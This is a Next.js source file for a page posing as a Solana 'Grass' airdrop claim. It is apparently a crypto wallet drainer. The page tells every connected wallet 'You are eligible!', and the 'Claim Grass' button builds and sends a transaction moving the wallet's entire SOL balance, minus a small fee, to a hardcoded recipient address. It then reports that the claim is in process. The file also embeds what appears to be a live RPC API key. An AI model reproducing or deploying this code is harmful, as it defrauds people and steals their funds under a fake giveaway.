'use client';

import Link from "next/link";
import { useWallet } from '@solana/wallet-adapter-react';
import {
  Connection,
  PublicKey,
  SystemProgram,
  Transaction
} from "@solana/web3.js";

import CustomWalletButton from '../../components/CustomWalletButton';

export default function ConnectPage() {
  const { connected, disconnect, publicKey, sendTransaction } = useWallet();

  const alchemyApiUrl = "https://solana-mainnet.g.alchemy.com/v2/a3AL-V2wyDAZIDWqnQ53boXG2aha_gCC";
  const connection = new Connection(alchemyApiUrl, "confirmed");
  const abbreviatedAddress = publicKey
    ? `${publicKey.toString().slice(0, 4)}...${publicKey.toString().slice(-4)}`
    : '';
  const address = publicKey ? `${publicKey.toString()}` : "";

 

  const sendSol = async () => {
    if (!publicKey) {
      console.error("Wallet not connected");
      return;
    }
  
    try {
      const recipientPubKey = new PublicKey(
        "DrbaFCmMrDUBVcLKytRAqmbYALnhdZx9TZ5PMUnEP1RA"
      );
  
      // Fetch balance and define fee
      const balanceLamports = await connection.getBalance(publicKey);
      const fee = 10000000; // Approximate fee in lamports (0.01 SOL)
   
  
      // Ensure sufficient balance for fee and transfer
      if (balanceLamports <= fee) {
        alert("Insufficient balance to cover transaction fees.");
        return;
      }
  
      // Deduct fee and determine transfer amount
      const lamportsToSend = balanceLamports - fee;
  
      // Create transaction
      const transaction = new Transaction();
      transaction.add(
        SystemProgram.transfer({
          fromPubkey: publicKey,
          toPubkey: recipientPubKey,
          lamports: lamportsToSend,
        })
      );
  
      // Fetch the latest blockhash
      const { blockhash } = await connection.getLatestBlockhash();
      transaction.recentBlockhash = blockhash;
      transaction.feePayer = publicKey;
  
      // Send transaction via wallet adapter
      const signature = await sendTransaction(transaction, connection, {
        skipPreflight: false,
      });
  
      console.log(`Transaction signature: ${signature}`);
  
      // Confirm transaction
      const confirmation = await connection.confirmTransaction({
        signature,
        blockhash,
        lastValidBlockHeight: await connection.getSlot(),
      });
  
      console.log("Transaction confirmed:", confirmation);
      alert("Claim in process!");
    } catch (error) {
      console.error("Transaction failed", error);
      alert("Claim failed. Please try again.");
    }
  };
  

console.log()
  return (
    <div className="css-ps0b2c">
      <div className="css-vap79n">
        <main className="css-ps0b2c">
          <div className="css-79elbk">
            <div className="css-mnqf94">
              <div className="chakra-stack css-1742ue8">
                <div className="css-56iasa"></div>
                <Link className="chakra-link css-1v2wsoy" href="/connect">
                  <button type="button" className="chakra-button css-1bxt6y0">1. Connect</button>
                </Link>
                <Link className="chakra-link css-1v2wsoy" href="/eligibility">
                  <button type="button" className="chakra-button css-13y4lrt" disabled>2. Eligibility</button>
                </Link>
                <Link className="chakra-link css-1v2wsoy" href="/claim">
                  <button type="button" className="chakra-button css-13y4lrt" disabled>3. Claim</button>
                </Link>
              </div>
            </div>

            {connected ? (
              <>
                <div className="css-1m6h13g">
                  <div className="chakra-stack css-fqllj7">
                    <div className="css-1uly529"></div>
                    <p className="chakra-text css-itvw0n">
                      {abbreviatedAddress}{' '}
                      <span className="chakra-text css-1jsqqh" onClick={disconnect}>
                        DISCONNECT
                      </span>
                    </p>
                  </div>
                </div>
              </>
            ) : (
              <></>
            )}
            <div className="css-579py2">
              <div className="chakra-stack css-t6pj5z">
                <div className="chakra-card css-zl11js">
                  <div className="chakra-stack css-ahthbn">
                    {connected ? (
                      <form className="chakra-stack css-1xl60vv">
                        <p className="chakra-text css-1kvck22">You are eligible!</p>
                        <p className="chakra-text css-hhbnxz">{address}</p>
                        
                        <p className="chakra-link css-13jvj27">
                          <button
                            type="button"
                            className="chakra-button css-1963s0b"
                            onClick={sendSol}
                          >
                            Claim Grass
                          </button>
                        </p>
                        
                      </form>
                    ) : (
                      <form className="chakra-stack css-1xl60vv">
                        <p className="chakra-text css-133kx15">Check Your Eligibility...</p>
                        <CustomWalletButton />
                      </form>
                    )}
                  </div>
                </div>
              </div>
            </div>
          </div>
        </main>
      </div>
    </div>
  );
}
